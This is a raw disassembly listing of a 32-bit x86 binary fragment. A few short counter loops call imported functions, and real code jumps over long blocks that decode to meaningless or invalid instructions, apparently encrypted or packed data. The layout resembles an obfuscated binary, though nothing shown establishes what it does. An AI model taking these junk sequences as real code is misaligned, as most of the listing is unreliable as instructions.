  40abd2:	sub    BYTE PTR [ecx],ah
  40abd4:	adc    BYTE PTR [ebp+0x49],bh
  40abd7:	xchg   ecx,eax
  40abd8:	mov    ds:0x3ef75e9a,eax
  40abdd:	or     dh,BYTE PTR [eax-0x362ec1f1]
  40abe3:	(bad)  
  40abe5:	jmp    0xac67:0xcad99893
  40abec:	or     al,0xd7
  40abee:	ss jns 0x40ac42
  40abf1:	mov    DWORD PTR es:[edi],edi
  40abf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abf5:	jb     0x40abde
  40abf7:	test   DWORD PTR [eax],edi
  40abf9:	xor    edx,DWORD PTR [ebx]
  40abfb:	push   ss
  40abfc:	loop   0x40ac7a
  40abfe:	adc    DWORD PTR [ebp-0x352160bf],ebp
  40ac04:	dec    ecx
  40ac05:	pusha  
  40ac06:	fs mov edi,0x64af0a0e
  40ac0c:	popf   
  40ac0d:	out    dx,eax
  40ac0e:	call   FWORD PTR [eax+0x76]
  40ac11:	add    eax,DWORD PTR [esi-0xe]
  40ac14:	push   cs
  40ac15:	push   es
  40ac16:	push   edx
  40ac17:	fs out 0x1,eax
  40ac1a:	jge    0x40abc8
  40ac1c:	adc    ch,dl
  40ac1e:	aam    0x14
  40ac20:	adc    BYTE PTR [esi-0x1bd62f38],bh
  40ac26:	in     eax,dx
  40ac27:	stos   BYTE PTR es:[edi],al
  40ac28:	adc    DWORD PTR [ebp+0x8],esp
  40ac2b:	out    0xd6,eax
  40ac2d:	rcl    DWORD PTR [edi+edx*2+0x2b0c41df],cl
  40ac34:	sub    al,0xe2
  40ac36:	mov    cl,0x3
  40ac38:	lods   al,BYTE PTR ds:[si]
  40ac3a:	mov    esp,0x37e71ca1
  40ac3f:	inc    ebp
  40ac40:	test   BYTE PTR ds:0x9b80b9bf,ch
  40ac46:	dec    edi
  40ac47:	test   DWORD PTR [ecx],eax
  40ac49:	inc    eax
  40ac4a:	jecxz  0x40ac2d
  40ac4c:	cmp    DWORD PTR [edx+0x3d],esp
  40ac4f:	mov    dh,0xaf
  40ac51:	dec    ebx
  40ac52:	xchg   esp,eax
  40ac53:	repnz in eax,0x7e
  40ac56:	(bad)  
  40ac57:	push   0xfc5012f9
  40ac5c:	mov    esi,0x2359186b
  40ac61:	mov    ecx,0xc03797a8
  40ac66:	inc    edx
  40ac67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac68:	dec    ebp
  40ac69:	inc    esp
  40ac6a:	jo     0x40ac38
  40ac6c:	jbe    0x40ac98
  40ac6e:	jne    0x40acbf
  40ac70:	sub    DWORD PTR [eax],edx
  40ac72:	test   DWORD PTR [esi+ebx*8],ebp
  40ac75:	pop    ss
  40ac76:	fst    DWORD PTR [esi+0x64458b0]
  40ac7c:	xchg   sp,ax
  40ac7e:	push   0x57
  40ac80:	push   ss
  40ac81:	cmc    
  40ac82:	in     eax,dx
  40ac83:	call   0x840f:0xc83b4cf3
  40ac8a:	pop    edi
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [esi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	ss inc ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x6a51b8ed],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acbf
  40ad2c:	adc    eax,DWORD PTR [ecx]
  40ad2e:	sbb    al,0x95
  40ad30:	push   ds
  40ad31:	out    0x12,eax
  40ad33:	xchg   ecx,eax
  40ad34:	xchg   DWORD PTR [eax],esi
  40ad36:	xchg   ebx,eax
  40ad37:	fdiv   QWORD PTR [ebx+ecx*2-0x37]
  40ad3b:	push   edx
  40ad3c:	mov    ds:0xfb808ebe,eax
  40ad41:	(bad)  
  40ad42:	out    dx,al
  40ad43:	loopne 0x40ad11
  40ad45:	sahf   
  40ad46:	sbb    al,0x32
  40ad48:	lahf   
  40ad49:	dec    edx
  40ad4a:	shl    eax,1
  40ad4c:	cmc    
  40ad4d:	xchg   esp,eax
  40ad4e:	bound  edx,QWORD PTR [eax-0x26]
  40ad51:	cdq    
  40ad52:	cmp    al,0x5c
  40ad54:	lahf   
  40ad55:	xlat   BYTE PTR ds:[ebx]
  40ad56:	stos   BYTE PTR es:[edi],al
  40ad57:	adc    al,0xb9
  40ad59:	scas   al,BYTE PTR es:[edi]
  40ad5a:	cdq    
  40ad5b:	loope  0x40ad6f
  40ad5d:	icebp  
  40ad5e:	dec    esp
  40ad5f:	cwde   
  40ad60:	inc    edi
  40ad61:	push   0x48383503
  40ad66:	scas   eax,DWORD PTR es:[edi]
  40ad67:	jge    0x40ad27
  40ad69:	test   BYTE PTR [ebp+0x40742601],ch
  40ad6f:	inc    esi
  40ad70:	ss dec esp
  40ad72:	loope  0x40ad6f
  40ad74:	addr16 int3 
  40ad76:	sbb    eax,0xb882d9b6
  40ad7b:	push   edx
  40ad7c:	inc    edi
  40ad7d:	cmp    esi,DWORD PTR [ecx-0x540888f2]
  40ad83:	lea    eax,[ebx]
  40ad85:	popf   
  40ad86:	mov    esp,0x79240ba8
  40ad8b:	or     ah,BYTE PTR [ecx]
  40ad8d:	adc    eax,0x92eec172
  40ad92:	call   0x886aec54
  40ad97:	jmp    0x40ad30
  40ad99:	or     eax,ecx
  40ad9b:	in     eax,dx
  40ad9c:	es int 0x75
  40ad9f:	addr16 push cs
  40ada1:	xor    BYTE PTR [ecx+0x14a22bcf],ah
  40ada7:	loopne 0x40adee
  40ada9:	mov    ebp,ecx
  40adab:	push   ebx
  40adac:	sub    ebx,DWORD PTR [ebp+0x700924e6]
  40adb2:	fdivr  QWORD PTR [eax+eiz*4+0x63]
  40adb6:	sub    DWORD PTR [edx],ebx
  40adb8:	nop
  40adb9:	inc    ebx
  40adba:	adc    eax,0x69c27235
  40adbf:	inc    esi
  40adc0:	aas    
  40adc1:	les    ebx,FWORD PTR [edx+ebx*2]
  40adc4:	sbb    BYTE PTR [ebx-0x1f],bl
  40adc7:	retf   0x7c91
  40adca:	mov    al,0x12
  40adcc:	scas   al,BYTE PTR es:[edi]
  40adcd:	sub    al,0xed
  40adcf:	inc    edi
  40add0:	ins    BYTE PTR es:[edi],dx
  40add1:	or     ebx,DWORD PTR [esi+0x59]
  40add4:	dec    eax
  40add5:	psubb  mm4,mm4
  40add8:	ss xchg ebx,eax
  40adda:	pop    edi
  40addb:	sbb    dl,BYTE PTR [eax]
  40addd:	sbb    eax,0xa9dd14e6
  40ade2:	xchg   esp,eax
  40ade3:	sbb    ebx,DWORD PTR [esi-0x362f6b6f]
  40ade9:	inc    ecx
  40adea:	iret   
  40adeb:	clc    
  40adec:	leave  
  40aded:	fwait
  40adee:	ror    eax,1
  40adf0:	ja     0x40ada9
  40adf2:	jp     0x40ae4c
  40adf4:	inc    eax
  40adf5:	push   ss
  40adf6:	(bad)  
  40adf8:	sub    eax,0x14a26f6c
  40adfd:	push   eax
  40adfe:	push   ds
  40adff:	xchg   ecx,eax
  40ae00:	push   ecx
  40ae01:	das    
  40ae02:	inc    edx
  40ae03:	xchg   BYTE PTR [edi+eiz*1],cl
  40ae06:	dec    ecx
  40ae07:	fst    DWORD PTR [edx+0x4328f1ba]
  40ae0d:	xor    BYTE PTR [esp+esi*1-0x374bf907],cl
  40ae14:	lods   al,BYTE PTR ds:[esi]
  40ae15:	mov    al,ds:0x823ece7b
  40ae1a:	ds imul esi,esi,0x1c
  40ae1e:	pop    edx
  40ae1f:	mov    ecx,0xb91ab41c
  40ae24:	jb     0x40ae00
  40ae26:	test   DWORD PTR [esi-0x29],eax
  40ae29:	push   ebx
  40ae2a:	mov    cs,WORD PTR fs:[edx-0x4]
  40ae2e:	int3   
  40ae2f:	jns    0x40add3
  40ae31:	inc    eax
  40ae32:	jns    0x40adfb
  40ae34:	sub    BYTE PTR [edx+ebx*1+0x47fb271f],dh
  40ae3b:	icebp  
  40ae3c:	stc    
  40ae3d:	inc    esp
  40ae3e:	mov    al,0x98
  40ae40:	mov    bh,0xa
  40ae42:	xor    eax,edx
  40ae44:	cwde   
  40ae45:	jno    0x40ae88
  40ae47:	nop
  40ae48:	xor    al,0x1a
  40ae4a:	sbb    ebx,edx
  40ae4c:	sbb    al,0xc0
  40ae4e:	cli    
  40ae4f:	sar    DWORD PTR [eax-0x4f],0xbd
  40ae53:	ins    DWORD PTR es:[edi],dx
  40ae54:	mov    dh,0x9a
  40ae56:	adc    bl,dh
  40ae58:	pusha  
  40ae59:	test   al,0xfa
  40ae5b:	jb     0x40ade5
  40ae5d:	xor    al,0x2d
  40ae5f:	pop    ebp
  40ae60:	popa   
  40ae61:	inc    ebx
  40ae62:	or     BYTE PTR [ecx-0x7bb0470],0x39
  40ae69:	jno    0x40aea2
  40ae6b:	rol    dl,1
  40ae6d:	mov    ecx,0x59ab55e9
  40ae72:	das    
  40ae73:	push   esp
  40ae74:	or     cl,bl
  40ae76:	push   ds
  40ae77:	por    mm7,QWORD PTR [esi]
  40ae7a:	jmp    0x6234e284
  40ae7f:	jg     0x40ae68
  40ae81:	out    0x62,al
  40ae83:	xchg   esp,eax
  40ae84:	popa   
  40ae85:	jge    0x40af00
  40ae87:	sbb    al,0xd6
  40ae89:	fist   WORD PTR [ebx]
  40ae8b:	pop    ds
  40ae8c:	pop    esp
  40ae8d:	jp     0x40ae5d
  40ae8f:	mov    WORD PTR [ecx+ebx*1],fs
  40ae92:	push   esp
  40ae93:	retf   
  40ae94:	fsubp  st(0),st
  40ae96:	sbb    eax,0xa9b5e89d
  40ae9b:	or     eax,0xe874f49c
  40aea0:	fidiv  DWORD PTR [ebp-0x29d7fcc8]
  40aea6:	xchg   BYTE PTR [ebx],cl
  40aea8:	hlt    
  40aea9:	in     eax,dx
  40aeaa:	push   cs
  40aeab:	call   0x307a:0x60e45fcb
  40aeb2:	out    0x78,al
  40aeb4:	or     BYTE PTR [ecx],al
  40aeb6:	pushf  
  40aeb7:	add    ebx,esi
  40aeb9:	sbb    BYTE PTR [eax],ch
  40aebb:	pop    eax
  40aebc:	ja     0x40ae91
  40aebe:	fmul   QWORD PTR [edx+0x23498e71]
  40aec4:	push   ecx
  40aec5:	mov    ch,0xf
  40aec7:	daa    
  40aec8:	pop    ecx
  40aec9:	and    edi,DWORD PTR [ecx-0x29]
  40aecc:	clc    
  40aecd:	jns    0x40aef5
  40aecf:	mov    eax,0x9b0f9678
  40aed4:	sar    DWORD PTR [edx+0x6c],0x2b
  40aed8:	jbe    0x40ae9b
  40aeda:	loope  0x40af13
  40aedc:	(bad)  [eax]
  40aede:	adc    eax,0x2b2e37d7
  40aee3:	xchg   BYTE PTR es:[edi+0x76],bh
  40aee7:	sbb    DWORD PTR [esp+eax*1-0x5c3f4dcb],0x16
  40aeef:	and    ch,0x3f
  40aef2:	sub    eax,0x701930aa
  40aef7:	iret   
  40aef8:	call   0x8f674b9
  40aefd:	mov    eax,0x2dbafea8
  40af02:	xor    al,0x7e
  40af04:	add    al,BYTE PTR [edi-0x32d2f573]
  40af0a:	pop    esi
  40af0b:	pop    edi
  40af0c:	xchg   edx,eax
  40af0d:	iret   
  40af0e:	mov    DWORD PTR [esi+0x50d355c1],esp
  40af14:	jbe    0x40af23
  40af16:	ds iret 
  40af18:	jae    0x40aeba
  40af1a:	test   eax,0x37c36b0d
  40af1f:	add    ch,BYTE PTR [ecx+0x4d84a74c]
  40af25:	imul   ebp,DWORD PTR [ebp-0x2b4c4a4b],0x23
  40af2c:	fcomp  DWORD PTR [ebx]
  40af2e:	mov    bl,0xcd
  40af30:	gs test ebx,ebp
  40af33:	repnz xor BYTE PTR [ebx],0xd5
  40af37:	and    BYTE PTR [edx+esi*2+0x4ab4e0ec],al
  40af3e:	ss in  eax,dx
  40af40:	push   0xd199bd5d
  40af45:	jge    0x40af54
  40af47:	xor    ah,BYTE PTR [eax]
  40af49:	or     al,0xf1
  40af4b:	js     0x40af4a
  40af4d:	scas   eax,DWORD PTR es:[edi]
  40af4e:	hlt    
  40af4f:	sbb    bh,al
  40af51:	or     DWORD PTR [edx-0x249aa53a],edi
  40af57:	jmp    0x40afad
  40af59:	test   DWORD PTR [edi+0x1e4aaa05],edx
  40af5f:	add    DWORD PTR ds:0x89f32e78,edx
  40af65:	fistp  QWORD PTR [eax+ebx*8+0x67eced7b]
  40af6c:	sbb    eax,0x69aef542
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	jge    0x40afcd
  40b019:	pop    es
  40b01a:	ins    DWORD PTR es:[edi],dx
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	mov    esi,0xe89203e7
  40b028:	mov    esi,0x974734d2
  40b02d:	dec    esi
  40b02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b02f:	and    eax,0x7246eede
  40b034:	and    al,0x12
  40b036:	push   es
  40b037:	daa    
  40b038:	xchg   esi,eax
  40b039:	out    dx,eax
  40b03a:	popa   
  40b03b:	mov    edi,0x97b4890f
  40b040:	push   0xffffffd5
  40b042:	mov    ebx,0xa6a5ab48
  40b047:	test   ah,bh
  40b049:	lahf   
  40b04a:	mov    eax,ds:0x48d4ab92
  40b04f:	xor    esi,esi
  40b051:	clc    
  40b052:	add    al,0xb1
  40b054:	jmp    0xfc4b:0x8d1b3652
  40b05b:	aad    0xcf
  40b05d:	sub    ebx,DWORD PTR [ebx-0x21]
  40b060:	xchg   esp,eax
  40b061:	leave  
  40b062:	mov    cl,0x1
  40b064:	push   edx
  40b065:	(bad)  [esi]
  40b067:	mov    ds:0x2ce8516b,al
  40b06c:	push   edi
  40b06d:	cld    
  40b06e:	sub    BYTE PTR [edi],ch
  40b070:	std    
  40b071:	lahf   
  40b072:	popa   
  40b073:	leave  
  40b074:	cmp    eax,0x77098753
  40b079:	push   cs
  40b07a:	cmp    eax,0x1fd5533f
  40b07f:	inc    edi
  40b080:	push   es
  40b081:	int3   
  40b082:	or     bl,bl
  40b084:	mov    ds:0x6a92ad38,eax
  40b089:	jp     0x40b0f5
  40b08b:	aam    0xef
  40b08d:	inc    edi
  40b08e:	lods   al,BYTE PTR ds:[esi]
  40b08f:	(bad)  
  40b090:	shl    BYTE PTR [ebx+eiz*2],cl
  40b093:	(bad)  
  40b094:	cli    
  40b095:	retf   0x7703
  40b098:	sbb    BYTE PTR [edi-0x382a24c5],dh
  40b09e:	ins    DWORD PTR es:[edi],dx
  40b09f:	data16 (bad) 
  40b0a2:	in     eax,dx
  40b0a3:	inc    ebp
  40b0a4:	xor    cl,BYTE PTR ds:0x5b19d4c4
  40b0aa:	loopne 0x40b075
  40b0ac:	xor    BYTE PTR ds:0x13a38fb4,dl
  40b0b2:	mov    edx,ecx
  40b0b4:	stos   DWORD PTR es:[edi],eax
  40b0b5:	js     0x40b092
  40b0b7:	fcom   st(6)
  40b0b9:	mov    ecx,0xb47a55
  40b0be:	dec    ecx
  40b0bf:	scas   al,BYTE PTR es:[edi]
  40b0c0:	xor    bl,BYTE PTR [edi+0x1]
  40b0c3:	int    0x89
  40b0c5:	jg     0x40b070
  40b0c7:	loop   0x40b0ee
  40b0c9:	lock jo 0x40b116
  40b0cc:	mov    bl,0xcc
  40b0ce:	xor    edi,edi
  40b0d0:	xchg   esp,eax
  40b0d1:	mov    edi,0xa17b8d85
  40b0d6:	mov    al,ds:0x7b7b5a2d
  40b0db:	inc    ecx
  40b0dc:	cli    
  40b0dd:	jmp    0x4f53:0xf6bd847c
  40b0e4:	outs   dx,DWORD PTR ds:[esi]
  40b0e5:	cmp    BYTE PTR [eax+0x24b089df],0xe5
  40b0ec:	inc    ebx
  40b0ed:	or     ecx,esp
  40b0ef:	fild   DWORD PTR [esp+ecx*1]
  40b0f2:	out    dx,al
  40b0f3:	rcl    BYTE PTR [esi+0x74be30f1],1
  40b0f9:	mov    ebx,0x92c007f1
  40b0fe:	outs   dx,DWORD PTR ds:[esi]
  40b0ff:	loop   0x40b0ed
  40b101:	mov    edx,DWORD PTR [edi]
  40b103:	aaa    
  40b104:	idiv   BYTE PTR [edx]
  40b106:	and    al,0x15
  40b108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b109:	mov    dh,0x1b
  40b10b:	aaa    
  40b10c:	int    0xe7
  40b10e:	int    0x3a
  40b110:	inc    ebp
  40b111:	adc    esi,ebp
  40b113:	test   BYTE PTR [edi-0x78ee6066],dl
  40b119:	ss retf 0xc383
  40b11d:	gs jo  0x40b19c
  40b120:	and    bl,BYTE PTR [edx-0x6ea19b4]
  40b126:	pusha  
  40b127:	ins    DWORD PTR es:[edi],dx
  40b128:	add    al,0xe8
  40b12a:	xor    DWORD PTR ds:0x594fe74a,ebp
  40b130:	aaa    
  40b131:	or     DWORD PTR [edx],esp
  40b133:	xor    dl,BYTE PTR [ebp-0x6a]
  40b136:	retf   0xb09d
  40b139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b13a:	jle    0x40b174
  40b13c:	jnp    0x40b196
  40b13e:	clc    
  40b13f:	outs   dx,DWORD PTR ds:[esi]
  40b140:	cmp    eax,0x946d788c
  40b145:	dec    ax
  40b147:	xchg   edi,eax
  40b148:	inc    ebp
  40b149:	out    dx,eax
  40b14a:	sbb    al,0x71
  40b14c:	pop    ebx
  40b14d:	rol    BYTE PTR [esi],1
  40b14f:	adc    eax,esi
  40b151:	xchg   ecx,eax
  40b152:	jae    0x40b147
  40b154:	mov    dh,0x3a
  40b156:	test   BYTE PTR [ebp+0x469d8223],bl
  40b15c:	sub    al,0x6c
  40b15e:	cmc    
  40b15f:	pop    ebx
  40b160:	es sbb eax,0x8c6b6103
  40b166:	out    0x9a,eax
  40b168:	pushf  
  40b169:	push   cs
  40b16a:	pop    esp
  40b16b:	cmp    eax,0x8d6a0952
  40b170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b171:	lods   eax,DWORD PTR ds:[esi]
  40b172:	cmp    BYTE PTR [edi-0x1a],dh
  40b175:	fild   WORD PTR [edx]
  40b177:	imul   esp,DWORD PTR [edi+0xe7ecc70],0x2088e27b
  40b181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b182:	loop   0x40b1c4
  40b184:	xor    DWORD PTR ds:[ebp+0x68dc96a8],edx
  40b18b:	dec    esp
  40b18c:	sbb    BYTE PTR [eax],dh
  40b18e:	inc    ebp
  40b18f:	cmp    al,0xef
  40b191:	shl    ebx,0xd
  40b194:	sub    DWORD PTR [edi],ecx
  40b196:	push   esi
  40b197:	(bad)  
  40b198:	cmc    
  40b199:	scas   al,BYTE PTR es:[edi]
  40b19a:	aam    0x82
  40b19c:	js     0x40b166
  40b19e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b19f:	idiv   al
  40b1a1:	mov    es,WORD PTR [ebx-0x65bae0bc]
  40b1a7:	jecxz  0x40b140
  40b1a9:	add    DWORD PTR [edx],eax
  40b1ab:	mov    ch,0x98
  40b1ad:	gs sti 
  40b1af:	(bad)  
  40b1b0:	cmp    al,0xf7
  40b1b2:	sub    al,0x2f
  40b1b4:	test   DWORD PTR [esi],ebx
  40b1b6:	cmc    
  40b1b7:	jp     0x40b1d8
  40b1b9:	xchg   edx,edx
  40b1bb:	jne    0x40b187
  40b1bd:	lds    esp,FWORD PTR [eax+edi*8-0x28]
  40b1c1:	js     0x40b194
  40b1c3:	push   0xad2dee32
  40b1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1c9:	jbe    0x40b22a
  40b1cb:	es xchg ebx,eax
  40b1cd:	sbb    BYTE PTR [ecx-0x65620d6c],dh
  40b1d3:	jmp    0x11e2:0x5f326fa7
  40b1da:	lock or eax,0x1ab21bc7
  40b1e0:	cmp    al,bh
  40b1e2:	add    al,0x5f
  40b1e4:	movntq (bad),mm4
  40b1e5:	out    0xe3,eax
  40b1e7:	loope  0x40b197
  40b1e9:	(bad)  
  40b1ea:	popf   
  40b1eb:	sbb    eax,0xf5ca2e52
  40b1f0:	cmp    BYTE PTR [esi],dh
  40b1f2:	test   DWORD PTR [eax],ebx
  40b1f4:	dec    esp
  40b1f5:	sbb    ecx,eax
  40b1f7:	cld    
  40b1f8:	test   BYTE PTR [esi-0x6220d2d6],0xb6
  40b1ff:	aad    0x6c
  40b201:	shr    bh,0x81
  40b204:	pop    ecx
  40b205:	out    0x21,al
  40b207:	mov    ebx,0x76a5a2bb
  40b20c:	inc    edx
  40b20d:	dec    ebp
  40b20e:	pop    esp
  40b20f:	jecxz  0x40b21b
  40b211:	jb     0x40b28d
  40b213:	pop    ecx
  40b214:	and    al,0x6d
  40b216:	mov    edx,?
  40b218:	loope  0x40b259
  40b21a:	inc    esi
  40b21b:	fld    QWORD PTR [edi+0x4d24fa8]
  40b221:	data16 inc BYTE PTR [edx+0x63]
  40b225:	push   edx
  40b226:	or     DWORD PTR [edx-0x57],0xffffffcb
  40b22a:	jae    0x40b267
  40b22c:	into   
  40b22d:	mov    cl,0xa9
  40b22f:	jmp    0xddfb:0xbcfc21aa
  40b236:	pop    esp
  40b237:	sub    al,0x94
  40b239:	mov    ebx,DWORD PTR [ecx-0x25]
  40b23c:	test   BYTE PTR [edi],cl
  40b23e:	cwde   
  40b23f:	push   esi
  40b240:	addr16 rol esp,cl
  40b243:	pop    edx
  40b244:	fbstp  TBYTE PTR [eax+0x38fbed68]
  40b24a:	inc    ebp
  40b24b:	dec    edi
  40b24c:	xchg   ecx,eax
  40b24d:	fcomp  QWORD PTR [edi]
  40b24f:	sbb    eax,0x63960e30
  40b254:	daa    
  40b255:	adc    al,0xad
  40b257:	icebp  
  40b258:	mov    ah,0x20
  40b25a:	in     al,0xbc
  40b25c:	retf   0x9e14
  40b25f:	popf   
  40b260:	pop    ss
  40b261:	loopne 0x40b255
  40b263:	pusha  
  40b264:	div    ah
  40b266:	lods   eax,DWORD PTR ds:[esi]
  40b267:	nop
  40b268:	jp     0x40b1f5
  40b26a:	inc    ebp
  40b26b:	in     al,dx
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	inc    esi
  40b284:	or     al,0xa4
  40b286:	or     ch,BYTE PTR [esi]
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	cmp    BYTE PTR [eax+edx*8],0xa2
  40b293:	and    DWORD PTR [edx+0x832d290],edx
  40b299:	sub    eax,esp
  40b29b:	in     eax,0xa4
  40b29d:	fcom   DWORD PTR [edx-0x44]
  40b2a0:	gs retf 0x8182
  40b2a4:	into   
  40b2a5:	pusha  
  40b2a6:	mov    edx,0xc77031e1
  40b2ab:	mov    ch,0x65
  40b2ad:	mov    al,BYTE PTR [ecx-0x3a]
  40b2b0:	mov    eax,ds:0x45cd3610
  40b2b5:	push   ds
  40b2b6:	mov    esp,0x2984c4bb
  40b2bb:	inc    eax
  40b2bc:	xor    eax,0x409b47ad
  40b2c1:	push   0x2c68ebff
  40b2c6:	sbb    dl,0x81
  40b2c9:	bound  eax,QWORD PTR [edx+ecx*4]
  40b2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2cd:	fbld   TBYTE PTR [esi]
  40b2cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2d0:	(bad)  
  40b2d1:	lahf   
  40b2d2:	sbb    BYTE PTR [eax+0x50],al
  40b2d5:	jb     0x40b314
  40b2d7:	cdq    
  40b2d8:	jns    0x40b2dc
  40b2da:	fcmovnb st,st(6)
  40b2dc:	adc    ch,0xa3
  40b2df:	cli    
  40b2e0:	out    dx,al
  40b2e1:	xlat   BYTE PTR ds:[ebx]
  40b2e2:	ins    DWORD PTR es:[edi],dx
  40b2e3:	push   es
  40b2e4:	cmp    ebp,DWORD PTR [ecx+0x37ba9589]
  40b2ea:	inc    ecx
  40b2eb:	jmp    0x40b2f3
  40b2ed:	push   cs
  40b2ee:	xchg   BYTE PTR [eax+0x4b],cl
  40b2f1:	cli    
  40b2f2:	dec    ebx
  40b2f3:	sub    ah,BYTE PTR [edi+esi*8+0x5e]
  40b2f7:	adc    DWORD PTR [edi],0x60
  40b2fa:	int3   
  40b2fb:	dec    edx
  40b2fc:	mov    edx,0x37e85056
  40b301:	jbe    0x40b2a7
  40b303:	repz (bad) 
  40b305:	out    0x60,eax
  40b307:	int3   
  40b308:	adc    al,0xe0
  40b30a:	mov    edi,0x9c77d559
  40b30f:	inc    ecx
  40b310:	scas   eax,DWORD PTR es:[edi]
  40b311:	iret   
  40b312:	xor    al,BYTE PTR [esi-0x70]
  40b315:	xor    DWORD PTR [edi+0xf0330a4],esp
  40b31b:	inc    ebp
  40b31c:	int    0x61
  40b31e:	nop
  40b31f:	imul   DWORD PTR [eax]
  40b321:	aam    0x82
  40b323:	imul   esi,DWORD PTR [ecx+0x1d],0xffffff85
  40b327:	pop    ds
  40b328:	or     eax,edx
  40b32a:	sub    al,0xf4
  40b32c:	pop    edi
  40b32d:	mov    bl,0x4d
  40b32f:	sub    ecx,DWORD PTR [ebx+0x411e34f0]
  40b335:	jo     0x40b373
  40b337:	out    0xc9,eax
  40b339:	push   edx
  40b33a:	lods   al,BYTE PTR ds:[esi]
  40b33b:	popa   
  40b33c:	int    0xec
  40b33e:	cmp    esi,DWORD PTR [esi+0x4]
  40b341:	imul   esp,DWORD PTR [esi+0x3c],0x42
  40b345:	sub    al,0xe
  40b347:	push   eax
  40b348:	push   es
  40b349:	inc    eax
  40b34a:	push   edx
  40b34b:	daa    
  40b34c:	or     esi,ebx
  40b34e:	sbb    eax,0x97c102da
  40b353:	mov    ds:0x30d7f1ad,eax
  40b358:	scas   al,BYTE PTR es:[edi]
  40b359:	int3   
  40b35a:	cmp    BYTE PTR [edx-0x28248d7],dl
  40b360:	xchg   esi,eax
  40b361:	and    bh,al
  40b363:	inc    edi
  40b364:	or     eax,0xebe1b5de
  40b369:	test   al,0xbc
  40b36b:	or     BYTE PTR [eax+0x4666e34f],dl
  40b371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b372:	fdivr  st,st(3)
  40b374:	arpl   WORD PTR [ecx+esi*4-0x7cf24e13],di
  40b37b:	ja     0x40b3a3
  40b37d:	bound  eax,QWORD PTR [ebx]
  40b37f:	sbb    esp,DWORD PTR [ecx-0x6d]
  40b382:	jno    0x40b39b
  40b384:	inc    ecx
  40b385:	test   eax,0x2a868141
  40b38a:	repnz mov ah,0xa6
  40b38d:	loopne 0x40b383
  40b38f:	test   BYTE PTR [edx-0x660a8c0d],bh
  40b395:	(bad)  
  40b397:	and    esp,0xffffffb8
